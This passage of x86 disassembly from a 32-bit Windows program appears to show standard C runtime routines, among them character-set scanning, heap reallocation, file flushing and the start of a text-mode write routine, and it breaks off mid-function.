  40aefe:	75 b2                	jne    0x40aeb2
  40af00:	83 fe ff             	cmp    $0xffffffff,%esi
  40af03:	75 0d                	jne    0x40af12
  40af05:	8b 45 0c             	mov    0xc(%ebp),%eax
  40af08:	6a 50                	push   $0x50
  40af0a:	c6 44 01 ff 00       	movb   $0x0,-0x1(%ecx,%eax,1)
  40af0f:	58                   	pop    %eax
  40af10:	eb 8a                	jmp    0x40ae9c
  40af12:	c6 01 00             	movb   $0x0,(%ecx)
  40af15:	e8 a1 c5 ff ff       	call   0x4074bb
  40af1a:	6a 22                	push   $0x22
  40af1c:	e9 71 ff ff ff       	jmp    0x40ae92
  40af21:	8b ff                	mov    %edi,%edi
  40af23:	55                   	push   %ebp
  40af24:	8b ec                	mov    %esp,%ebp
  40af26:	5d                   	pop    %ebp
  40af27:	e9 42 ff ff ff       	jmp    0x40ae6e
  40af2c:	cc                   	int3
  40af2d:	cc                   	int3
  40af2e:	cc                   	int3
  40af2f:	cc                   	int3
  40af30:	55                   	push   %ebp
  40af31:	8b ec                	mov    %esp,%ebp
  40af33:	56                   	push   %esi
  40af34:	33 c0                	xor    %eax,%eax
  40af36:	50                   	push   %eax
  40af37:	50                   	push   %eax
  40af38:	50                   	push   %eax
  40af39:	50                   	push   %eax
  40af3a:	50                   	push   %eax
  40af3b:	50                   	push   %eax
  40af3c:	50                   	push   %eax
  40af3d:	50                   	push   %eax
  40af3e:	8b 55 0c             	mov    0xc(%ebp),%edx
  40af41:	8d 49 00             	lea    0x0(%ecx),%ecx
  40af44:	8a 02                	mov    (%edx),%al
  40af46:	0a c0                	or     %al,%al
  40af48:	74 09                	je     0x40af53
  40af4a:	83 c2 01             	add    $0x1,%edx
  40af4d:	0f ab 04 24          	bts    %eax,(%esp)
  40af51:	eb f1                	jmp    0x40af44
  40af53:	8b 75 08             	mov    0x8(%ebp),%esi
  40af56:	8b ff                	mov    %edi,%edi
  40af58:	8a 06                	mov    (%esi),%al
  40af5a:	0a c0                	or     %al,%al
  40af5c:	74 0c                	je     0x40af6a
  40af5e:	83 c6 01             	add    $0x1,%esi
  40af61:	0f a3 04 24          	bt     %eax,(%esp)
  40af65:	73 f1                	jae    0x40af58
  40af67:	8d 46 ff             	lea    -0x1(%esi),%eax
  40af6a:	83 c4 20             	add    $0x20,%esp
  40af6d:	5e                   	pop    %esi
  40af6e:	c9                   	leave
  40af6f:	c3                   	ret
  40af70:	8b ff                	mov    %edi,%edi
  40af72:	55                   	push   %ebp
  40af73:	8b ec                	mov    %esp,%ebp
  40af75:	6a 00                	push   $0x0
  40af77:	ff 75 0c             	push   0xc(%ebp)
  40af7a:	ff 75 08             	push   0x8(%ebp)
  40af7d:	e8 05 00 00 00       	call   0x40af87
  40af82:	83 c4 0c             	add    $0xc,%esp
  40af85:	5d                   	pop    %ebp
  40af86:	c3                   	ret
  40af87:	8b ff                	mov    %edi,%edi
  40af89:	55                   	push   %ebp
  40af8a:	8b ec                	mov    %esp,%ebp
  40af8c:	83 ec 10             	sub    $0x10,%esp
  40af8f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40af93:	75 14                	jne    0x40afa9
  40af95:	e8 21 c5 ff ff       	call   0x4074bb
  40af9a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40afa0:	e8 59 c4 ff ff       	call   0x4073fe
  40afa5:	33 c0                	xor    %eax,%eax
  40afa7:	c9                   	leave
  40afa8:	c3                   	ret
  40afa9:	56                   	push   %esi
  40afaa:	8b 75 0c             	mov    0xc(%ebp),%esi
  40afad:	85 f6                	test   %esi,%esi
  40afaf:	75 12                	jne    0x40afc3
  40afb1:	e8 05 c5 ff ff       	call   0x4074bb
  40afb6:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40afbc:	e8 3d c4 ff ff       	call   0x4073fe
  40afc1:	eb 05                	jmp    0x40afc8
  40afc3:	39 75 08             	cmp    %esi,0x8(%ebp)
  40afc6:	72 04                	jb     0x40afcc
  40afc8:	33 c0                	xor    %eax,%eax
  40afca:	eb 45                	jmp    0x40b011
  40afcc:	ff 75 10             	push   0x10(%ebp)
  40afcf:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40afd2:	e8 89 a8 ff ff       	call   0x405860
  40afd7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40afda:	8d 56 ff             	lea    -0x1(%esi),%edx
  40afdd:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  40afe1:	74 1c                	je     0x40afff
  40afe3:	4a                   	dec    %edx
  40afe4:	39 55 08             	cmp    %edx,0x8(%ebp)
  40afe7:	77 0a                	ja     0x40aff3
  40afe9:	0f b6 02             	movzbl (%edx),%eax
  40afec:	f6 44 08 19 04       	testb  $0x4,0x19(%eax,%ecx,1)
  40aff1:	75 f0                	jne    0x40afe3
  40aff3:	8b c6                	mov    %esi,%eax
  40aff5:	2b c2                	sub    %edx,%eax
  40aff7:	8b d6                	mov    %esi,%edx
  40aff9:	83 e0 01             	and    $0x1,%eax
  40affc:	2b d0                	sub    %eax,%edx
  40affe:	4a                   	dec    %edx
  40afff:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40b003:	74 0a                	je     0x40b00f
  40b005:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b008:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  40b00f:	8b c2                	mov    %edx,%eax
  40b011:	5e                   	pop    %esi
  40b012:	c9                   	leave
  40b013:	c3                   	ret
  40b014:	8b ff                	mov    %edi,%edi
  40b016:	55                   	push   %ebp
  40b017:	8b ec                	mov    %esp,%ebp
  40b019:	51                   	push   %ecx
  40b01a:	51                   	push   %ecx
  40b01b:	a1 04 60 41 00       	mov    0x416004,%eax
  40b020:	33 c5                	xor    %ebp,%eax
  40b022:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b025:	53                   	push   %ebx
  40b026:	56                   	push   %esi
  40b027:	8b 75 18             	mov    0x18(%ebp),%esi
  40b02a:	57                   	push   %edi
  40b02b:	85 f6                	test   %esi,%esi
  40b02d:	7e 14                	jle    0x40b043
  40b02f:	56                   	push   %esi
  40b030:	ff 75 14             	push   0x14(%ebp)
  40b033:	e8 45 12 00 00       	call   0x40c27d
  40b038:	59                   	pop    %ecx
  40b039:	3b c6                	cmp    %esi,%eax
  40b03b:	59                   	pop    %ecx
  40b03c:	8d 70 01             	lea    0x1(%eax),%esi
  40b03f:	7c 02                	jl     0x40b043
  40b041:	8b f0                	mov    %eax,%esi
  40b043:	8b 7d 24             	mov    0x24(%ebp),%edi
  40b046:	85 ff                	test   %edi,%edi
  40b048:	75 0b                	jne    0x40b055
  40b04a:	8b 45 08             	mov    0x8(%ebp),%eax
  40b04d:	8b 00                	mov    (%eax),%eax
  40b04f:	8b 78 08             	mov    0x8(%eax),%edi
  40b052:	89 7d 24             	mov    %edi,0x24(%ebp)
  40b055:	33 c0                	xor    %eax,%eax
  40b057:	39 45 28             	cmp    %eax,0x28(%ebp)
  40b05a:	6a 00                	push   $0x0
  40b05c:	6a 00                	push   $0x0
  40b05e:	0f 95 c0             	setne  %al
  40b061:	56                   	push   %esi
  40b062:	ff 75 14             	push   0x14(%ebp)
  40b065:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  40b06c:	50                   	push   %eax
  40b06d:	57                   	push   %edi
  40b06e:	e8 d2 dc ff ff       	call   0x408d45
  40b073:	8b d0                	mov    %eax,%edx
  40b075:	83 c4 18             	add    $0x18,%esp
  40b078:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40b07b:	85 d2                	test   %edx,%edx
  40b07d:	0f 84 58 01 00 00    	je     0x40b1db
  40b083:	8d 04 12             	lea    (%edx,%edx,1),%eax
  40b086:	8d 48 08             	lea    0x8(%eax),%ecx
  40b089:	3b c1                	cmp    %ecx,%eax
  40b08b:	1b c0                	sbb    %eax,%eax
  40b08d:	23 c1                	and    %ecx,%eax
  40b08f:	74 35                	je     0x40b0c6
  40b091:	3d 00 04 00 00       	cmp    $0x400,%eax
  40b096:	77 13                	ja     0x40b0ab
  40b098:	e8 d3 33 00 00       	call   0x40e470
  40b09d:	8b dc                	mov    %esp,%ebx
  40b09f:	85 db                	test   %ebx,%ebx
  40b0a1:	74 1e                	je     0x40b0c1
  40b0a3:	c7 03 cc cc 00 00    	movl   $0xcccc,(%ebx)
  40b0a9:	eb 13                	jmp    0x40b0be
  40b0ab:	50                   	push   %eax
  40b0ac:	e8 6b c9 ff ff       	call   0x407a1c
  40b0b1:	8b d8                	mov    %eax,%ebx
  40b0b3:	59                   	pop    %ecx
  40b0b4:	85 db                	test   %ebx,%ebx
  40b0b6:	74 09                	je     0x40b0c1
  40b0b8:	c7 03 dd dd 00 00    	movl   $0xdddd,(%ebx)
  40b0be:	83 c3 08             	add    $0x8,%ebx
  40b0c1:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40b0c4:	eb 02                	jmp    0x40b0c8
  40b0c6:	33 db                	xor    %ebx,%ebx
  40b0c8:	85 db                	test   %ebx,%ebx
  40b0ca:	0f 84 00 01 00 00    	je     0x40b1d0
  40b0d0:	52                   	push   %edx
  40b0d1:	53                   	push   %ebx
  40b0d2:	56                   	push   %esi
  40b0d3:	ff 75 14             	push   0x14(%ebp)
  40b0d6:	6a 01                	push   $0x1
  40b0d8:	57                   	push   %edi
  40b0d9:	e8 67 dc ff ff       	call   0x408d45
  40b0de:	83 c4 18             	add    $0x18,%esp
  40b0e1:	85 c0                	test   %eax,%eax
  40b0e3:	0f 84 e7 00 00 00    	je     0x40b1d0
  40b0e9:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b0ec:	33 c0                	xor    %eax,%eax
  40b0ee:	50                   	push   %eax
  40b0ef:	50                   	push   %eax
  40b0f0:	50                   	push   %eax
  40b0f1:	50                   	push   %eax
  40b0f2:	50                   	push   %eax
  40b0f3:	57                   	push   %edi
  40b0f4:	53                   	push   %ebx
  40b0f5:	ff 75 10             	push   0x10(%ebp)
  40b0f8:	ff 75 0c             	push   0xc(%ebp)
  40b0fb:	e8 0f c7 ff ff       	call   0x40780f
  40b100:	8b f0                	mov    %eax,%esi
  40b102:	85 f6                	test   %esi,%esi
  40b104:	0f 84 c6 00 00 00    	je     0x40b1d0
  40b10a:	ba 00 04 00 00       	mov    $0x400,%edx
  40b10f:	85 55 10             	test   %edx,0x10(%ebp)
  40b112:	74 38                	je     0x40b14c
  40b114:	8b 45 20             	mov    0x20(%ebp),%eax
  40b117:	85 c0                	test   %eax,%eax
  40b119:	0f 84 b3 00 00 00    	je     0x40b1d2
  40b11f:	3b f0                	cmp    %eax,%esi
  40b121:	0f 8f a9 00 00 00    	jg     0x40b1d0
  40b127:	33 c9                	xor    %ecx,%ecx
  40b129:	51                   	push   %ecx
  40b12a:	51                   	push   %ecx
  40b12b:	51                   	push   %ecx
  40b12c:	50                   	push   %eax
  40b12d:	ff 75 1c             	push   0x1c(%ebp)
  40b130:	57                   	push   %edi
  40b131:	53                   	push   %ebx
  40b132:	ff 75 10             	push   0x10(%ebp)
  40b135:	ff 75 0c             	push   0xc(%ebp)
  40b138:	e8 d2 c6 ff ff       	call   0x40780f
  40b13d:	8b f0                	mov    %eax,%esi
  40b13f:	85 f6                	test   %esi,%esi
  40b141:	0f 85 8b 00 00 00    	jne    0x40b1d2
  40b147:	e9 84 00 00 00       	jmp    0x40b1d0
  40b14c:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40b14f:	8d 48 08             	lea    0x8(%eax),%ecx
  40b152:	3b c1                	cmp    %ecx,%eax
  40b154:	1b c0                	sbb    %eax,%eax
  40b156:	23 c1                	and    %ecx,%eax
  40b158:	74 2f                	je     0x40b189
  40b15a:	3b c2                	cmp    %edx,%eax
  40b15c:	77 13                	ja     0x40b171
  40b15e:	e8 0d 33 00 00       	call   0x40e470
  40b163:	8b fc                	mov    %esp,%edi
  40b165:	85 ff                	test   %edi,%edi
  40b167:	74 60                	je     0x40b1c9
  40b169:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  40b16f:	eb 13                	jmp    0x40b184
  40b171:	50                   	push   %eax
  40b172:	e8 a5 c8 ff ff       	call   0x407a1c
  40b177:	8b f8                	mov    %eax,%edi
  40b179:	59                   	pop    %ecx
  40b17a:	85 ff                	test   %edi,%edi
  40b17c:	74 4b                	je     0x40b1c9
  40b17e:	c7 07 dd dd 00 00    	movl   $0xdddd,(%edi)
  40b184:	83 c7 08             	add    $0x8,%edi
  40b187:	eb 02                	jmp    0x40b18b
  40b189:	33 ff                	xor    %edi,%edi
  40b18b:	85 ff                	test   %edi,%edi
  40b18d:	74 3a                	je     0x40b1c9
  40b18f:	6a 00                	push   $0x0
  40b191:	6a 00                	push   $0x0
  40b193:	6a 00                	push   $0x0
  40b195:	56                   	push   %esi
  40b196:	57                   	push   %edi
  40b197:	ff 75 f8             	push   -0x8(%ebp)
  40b19a:	53                   	push   %ebx
  40b19b:	ff 75 10             	push   0x10(%ebp)
  40b19e:	ff 75 0c             	push   0xc(%ebp)
  40b1a1:	e8 69 c6 ff ff       	call   0x40780f
  40b1a6:	85 c0                	test   %eax,%eax
  40b1a8:	74 1f                	je     0x40b1c9
  40b1aa:	33 c0                	xor    %eax,%eax
  40b1ac:	50                   	push   %eax
  40b1ad:	50                   	push   %eax
  40b1ae:	39 45 20             	cmp    %eax,0x20(%ebp)
  40b1b1:	75 3a                	jne    0x40b1ed
  40b1b3:	50                   	push   %eax
  40b1b4:	50                   	push   %eax
  40b1b5:	56                   	push   %esi
  40b1b6:	57                   	push   %edi
  40b1b7:	50                   	push   %eax
  40b1b8:	ff 75 24             	push   0x24(%ebp)
  40b1bb:	e8 01 dc ff ff       	call   0x408dc1
  40b1c0:	8b f0                	mov    %eax,%esi
  40b1c2:	83 c4 20             	add    $0x20,%esp
  40b1c5:	85 f6                	test   %esi,%esi
  40b1c7:	75 2c                	jne    0x40b1f5
  40b1c9:	57                   	push   %edi
  40b1ca:	e8 b9 e5 ff ff       	call   0x409788
  40b1cf:	59                   	pop    %ecx
  40b1d0:	33 f6                	xor    %esi,%esi
  40b1d2:	53                   	push   %ebx
  40b1d3:	e8 b0 e5 ff ff       	call   0x409788
  40b1d8:	59                   	pop    %ecx
  40b1d9:	8b c6                	mov    %esi,%eax
  40b1db:	8d 65 ec             	lea    -0x14(%ebp),%esp
  40b1de:	5f                   	pop    %edi
  40b1df:	5e                   	pop    %esi
  40b1e0:	5b                   	pop    %ebx
  40b1e1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b1e4:	33 cd                	xor    %ebp,%ecx
  40b1e6:	e8 5a 85 ff ff       	call   0x403745
  40b1eb:	c9                   	leave
  40b1ec:	c3                   	ret
  40b1ed:	ff 75 20             	push   0x20(%ebp)
  40b1f0:	ff 75 1c             	push   0x1c(%ebp)
  40b1f3:	eb c0                	jmp    0x40b1b5
  40b1f5:	57                   	push   %edi
  40b1f6:	e8 8d e5 ff ff       	call   0x409788
  40b1fb:	59                   	pop    %ecx
  40b1fc:	eb d4                	jmp    0x40b1d2
  40b1fe:	8b ff                	mov    %edi,%edi
  40b200:	55                   	push   %ebp
  40b201:	8b ec                	mov    %esp,%ebp
  40b203:	83 ec 10             	sub    $0x10,%esp
  40b206:	ff 75 08             	push   0x8(%ebp)
  40b209:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b20c:	e8 4f a6 ff ff       	call   0x405860
  40b211:	ff 75 28             	push   0x28(%ebp)
  40b214:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b217:	ff 75 24             	push   0x24(%ebp)
  40b21a:	ff 75 20             	push   0x20(%ebp)
  40b21d:	ff 75 1c             	push   0x1c(%ebp)
  40b220:	ff 75 18             	push   0x18(%ebp)
  40b223:	ff 75 14             	push   0x14(%ebp)
  40b226:	ff 75 10             	push   0x10(%ebp)
  40b229:	ff 75 0c             	push   0xc(%ebp)
  40b22c:	50                   	push   %eax
  40b22d:	e8 e2 fd ff ff       	call   0x40b014
  40b232:	83 c4 24             	add    $0x24,%esp
  40b235:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40b239:	74 0a                	je     0x40b245
  40b23b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b23e:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  40b245:	c9                   	leave
  40b246:	c3                   	ret
  40b247:	e8 a2 d7 ff ff       	call   0x4089ee
  40b24c:	33 c9                	xor    %ecx,%ecx
  40b24e:	84 c0                	test   %al,%al
  40b250:	0f 94 c1             	sete   %cl
  40b253:	8b c1                	mov    %ecx,%eax
  40b255:	c3                   	ret
  40b256:	8b ff                	mov    %edi,%edi
  40b258:	55                   	push   %ebp
  40b259:	8b ec                	mov    %esp,%ebp
  40b25b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b25f:	75 15                	jne    0x40b276
  40b261:	e8 55 c2 ff ff       	call   0x4074bb
  40b266:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40b26c:	e8 8d c1 ff ff       	call   0x4073fe
  40b271:	83 c8 ff             	or     $0xffffffff,%eax
  40b274:	5d                   	pop    %ebp
  40b275:	c3                   	ret
  40b276:	ff 75 08             	push   0x8(%ebp)
  40b279:	6a 00                	push   $0x0
  40b27b:	ff 35 d4 72 41 00    	push   0x4172d4
  40b281:	ff 15 44 f1 40 00    	call   *0x40f144
  40b287:	5d                   	pop    %ebp
  40b288:	c3                   	ret
  40b289:	8b ff                	mov    %edi,%edi
  40b28b:	55                   	push   %ebp
  40b28c:	8b ec                	mov    %esp,%ebp
  40b28e:	57                   	push   %edi
  40b28f:	8b 7d 08             	mov    0x8(%ebp),%edi
  40b292:	85 ff                	test   %edi,%edi
  40b294:	75 0b                	jne    0x40b2a1
  40b296:	ff 75 0c             	push   0xc(%ebp)
  40b299:	e8 7e c7 ff ff       	call   0x407a1c
  40b29e:	59                   	pop    %ecx
  40b29f:	eb 24                	jmp    0x40b2c5
  40b2a1:	56                   	push   %esi
  40b2a2:	8b 75 0c             	mov    0xc(%ebp),%esi
  40b2a5:	85 f6                	test   %esi,%esi
  40b2a7:	75 09                	jne    0x40b2b2
  40b2a9:	57                   	push   %edi
  40b2aa:	e8 18 c8 ff ff       	call   0x407ac7
  40b2af:	59                   	pop    %ecx
  40b2b0:	eb 10                	jmp    0x40b2c2
  40b2b2:	83 fe e0             	cmp    $0xffffffe0,%esi
  40b2b5:	76 25                	jbe    0x40b2dc
  40b2b7:	e8 ff c1 ff ff       	call   0x4074bb
  40b2bc:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40b2c2:	33 c0                	xor    %eax,%eax
  40b2c4:	5e                   	pop    %esi
  40b2c5:	5f                   	pop    %edi
  40b2c6:	5d                   	pop    %ebp
  40b2c7:	c3                   	ret
  40b2c8:	e8 0f b3 ff ff       	call   0x4065dc
  40b2cd:	85 c0                	test   %eax,%eax
  40b2cf:	74 e6                	je     0x40b2b7
  40b2d1:	56                   	push   %esi
  40b2d2:	e8 6a a6 ff ff       	call   0x405941
  40b2d7:	59                   	pop    %ecx
  40b2d8:	85 c0                	test   %eax,%eax
  40b2da:	74 db                	je     0x40b2b7
  40b2dc:	56                   	push   %esi
  40b2dd:	57                   	push   %edi
  40b2de:	6a 00                	push   $0x0
  40b2e0:	ff 35 d4 72 41 00    	push   0x4172d4
  40b2e6:	ff 15 40 f1 40 00    	call   *0x40f140
  40b2ec:	85 c0                	test   %eax,%eax
  40b2ee:	74 d8                	je     0x40b2c8
  40b2f0:	eb d2                	jmp    0x40b2c4
  40b2f2:	6a 0c                	push   $0xc
  40b2f4:	68 38 4b 41 00       	push   $0x414b38
  40b2f9:	e8 f2 8e ff ff       	call   0x4041f0
  40b2fe:	33 f6                	xor    %esi,%esi
  40b300:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40b303:	8b 45 08             	mov    0x8(%ebp),%eax
  40b306:	ff 30                	push   (%eax)
  40b308:	e8 a8 dd ff ff       	call   0x4090b5
  40b30d:	59                   	pop    %ecx
  40b30e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40b311:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b314:	8b 00                	mov    (%eax),%eax
  40b316:	8b 38                	mov    (%eax),%edi
  40b318:	8b d7                	mov    %edi,%edx
  40b31a:	c1 fa 06             	sar    $0x6,%edx
  40b31d:	8b c7                	mov    %edi,%eax
  40b31f:	83 e0 3f             	and    $0x3f,%eax
  40b322:	6b c8 38             	imul   $0x38,%eax,%ecx
  40b325:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40b32c:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40b331:	74 21                	je     0x40b354
  40b333:	57                   	push   %edi
  40b334:	e8 53 de ff ff       	call   0x40918c
  40b339:	59                   	pop    %ecx
  40b33a:	50                   	push   %eax
  40b33b:	ff 15 3c f1 40 00    	call   *0x40f13c
  40b341:	85 c0                	test   %eax,%eax
  40b343:	75 1d                	jne    0x40b362
  40b345:	e8 5e c1 ff ff       	call   0x4074a8
  40b34a:	8b f0                	mov    %eax,%esi
  40b34c:	ff 15 70 f0 40 00    	call   *0x40f070
  40b352:	89 06                	mov    %eax,(%esi)
  40b354:	e8 62 c1 ff ff       	call   0x4074bb
  40b359:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b35f:	83 ce ff             	or     $0xffffffff,%esi
  40b362:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40b365:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40b36c:	e8 17 00 00 00       	call   0x40b388
  40b371:	8b c6                	mov    %esi,%eax
  40b373:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b376:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40b37d:	59                   	pop    %ecx
  40b37e:	5f                   	pop    %edi
  40b37f:	5e                   	pop    %esi
  40b380:	5b                   	pop    %ebx
  40b381:	c9                   	leave
  40b382:	c2 0c 00             	ret    $0xc
  40b385:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40b388:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b38b:	ff 31                	push   (%ecx)
  40b38d:	e8 46 dd ff ff       	call   0x4090d8
  40b392:	59                   	pop    %ecx
  40b393:	c3                   	ret
  40b394:	8b ff                	mov    %edi,%edi
  40b396:	55                   	push   %ebp
  40b397:	8b ec                	mov    %esp,%ebp
  40b399:	83 ec 10             	sub    $0x10,%esp
  40b39c:	56                   	push   %esi
  40b39d:	8b 75 08             	mov    0x8(%ebp),%esi
  40b3a0:	83 fe fe             	cmp    $0xfffffffe,%esi
  40b3a3:	75 0d                	jne    0x40b3b2
  40b3a5:	e8 11 c1 ff ff       	call   0x4074bb
  40b3aa:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b3b0:	eb 59                	jmp    0x40b40b
  40b3b2:	85 f6                	test   %esi,%esi
  40b3b4:	78 45                	js     0x40b3fb
  40b3b6:	3b 35 c8 72 41 00    	cmp    0x4172c8,%esi
  40b3bc:	73 3d                	jae    0x40b3fb
  40b3be:	8b c6                	mov    %esi,%eax
  40b3c0:	8b d6                	mov    %esi,%edx
  40b3c2:	83 e0 3f             	and    $0x3f,%eax
  40b3c5:	c1 fa 06             	sar    $0x6,%edx
  40b3c8:	6b c8 38             	imul   $0x38,%eax,%ecx
  40b3cb:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40b3d2:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40b3d7:	74 22                	je     0x40b3fb
  40b3d9:	8d 45 08             	lea    0x8(%ebp),%eax
  40b3dc:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40b3df:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b3e2:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40b3e5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40b3e8:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40b3eb:	50                   	push   %eax
  40b3ec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b3ef:	50                   	push   %eax
  40b3f0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b3f3:	50                   	push   %eax
  40b3f4:	e8 f9 fe ff ff       	call   0x40b2f2
  40b3f9:	eb 13                	jmp    0x40b40e
  40b3fb:	e8 bb c0 ff ff       	call   0x4074bb
  40b400:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40b406:	e8 f3 bf ff ff       	call   0x4073fe
  40b40b:	83 c8 ff             	or     $0xffffffff,%eax
  40b40e:	5e                   	pop    %esi
  40b40f:	c9                   	leave
  40b410:	c3                   	ret
  40b411:	8b ff                	mov    %edi,%edi
  40b413:	55                   	push   %ebp
  40b414:	8b ec                	mov    %esp,%ebp
  40b416:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  40b41c:	a1 04 60 41 00       	mov    0x416004,%eax
  40b421:	33 c5                	xor    %ebp,%eax
  40b423:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b426:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b429:	8b d0                	mov    %eax,%edx
  40b42b:	83 e0 3f             	and    $0x3f,%eax
  40b42e:	c1 fa 06             	sar    $0x6,%edx
  40b431:	6b c8 38             	imul   $0x38,%eax,%ecx
  40b434:	53                   	push   %ebx
  40b435:	56                   	push   %esi
  40b436:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40b43d:	57                   	push   %edi
  40b43e:	8b 7d 10             	mov    0x10(%ebp),%edi
  40b441:	89 7d 98             	mov    %edi,-0x68(%ebp)
  40b444:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  40b447:	8b 44 01 18          	mov    0x18(%ecx,%eax,1),%eax
  40b44b:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40b44e:	8b 45 14             	mov    0x14(%ebp),%eax
  40b451:	03 c7                	add    %edi,%eax
  40b453:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40b456:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40b459:	ff 15 38 f1 40 00    	call   *0x40f138
  40b45f:	33 db                	xor    %ebx,%ebx
  40b461:	89 45 88             	mov    %eax,-0x78(%ebp)
  40b464:	53                   	push   %ebx
  40b465:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b468:	e8 f3 a3 ff ff       	call   0x405860
  40b46d:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40b470:	8b c7                	mov    %edi,%eax
  40b472:	8b f3                	mov    %ebx,%esi
  40b474:	89 5d a8             	mov    %ebx,-0x58(%ebp)
  40b477:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40b47a:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  40b47d:	8b 49 08             	mov    0x8(%ecx),%ecx
  40b480:	89 4d 84             	mov    %ecx,-0x7c(%ebp)
  40b483:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40b486:	3b 45 a4             	cmp    -0x5c(%ebp),%eax
  40b489:	0f 83 05 03 00 00    	jae    0x40b794
  40b48f:	8a 07                	mov    (%edi),%al
  40b491:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
  40b497:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40b49a:	88 45 d1             	mov    %al,-0x2f(%ebp)
  40b49d:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40b4a0:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  40b4a3:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  40b4aa:	8b 04 85 c8 70 41 00 	mov    0x4170c8(,%eax,4),%eax
  40b4b1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40b4b4:	0f 85 33 01 00 00    	jne    0x40b5ed
  40b4ba:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40b4bd:	8b c3                	mov    %ebx,%eax
  40b4bf:	83 c2 2e             	add    $0x2e,%edx
  40b4c2:	03 d1                	add    %ecx,%edx
  40b4c4:	89 55 90             	mov    %edx,-0x70(%ebp)
  40b4c7:	38 1c 02             	cmp    %bl,(%edx,%eax,1)
  40b4ca:	74 06                	je     0x40b4d2
  40b4cc:	40                   	inc    %eax
  40b4cd:	83 f8 05             	cmp    $0x5,%eax
  40b4d0:	7c f5                	jl     0x40b4c7
  40b4d2:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  40b4d5:	2b d7                	sub    %edi,%edx
  40b4d7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b4da:	85 c0                	test   %eax,%eax
  40b4dc:	0f 8e b1 00 00 00    	jle    0x40b593
  40b4e2:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40b4e5:	0f b6 44 01 2e       	movzbl 0x2e(%ecx,%eax,1),%eax
  40b4ea:	0f be 80 58 67 41 00 	movsbl 0x416758(%eax),%eax
  40b4f1:	40                   	inc    %eax
  40b4f2:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40b4f5:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40b4f8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40b4fb:	3b c2                	cmp    %edx,%eax
  40b4fd:	0f 8f 10 02 00 00    	jg     0x40b713
  40b503:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b506:	8b f3                	mov    %ebx,%esi
  40b508:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40b50b:	8a 04 31             	mov    (%ecx,%esi,1),%al
  40b50e:	88 44 35 f4          	mov    %al,-0xc(%ebp,%esi,1)
  40b512:	46                   	inc    %esi
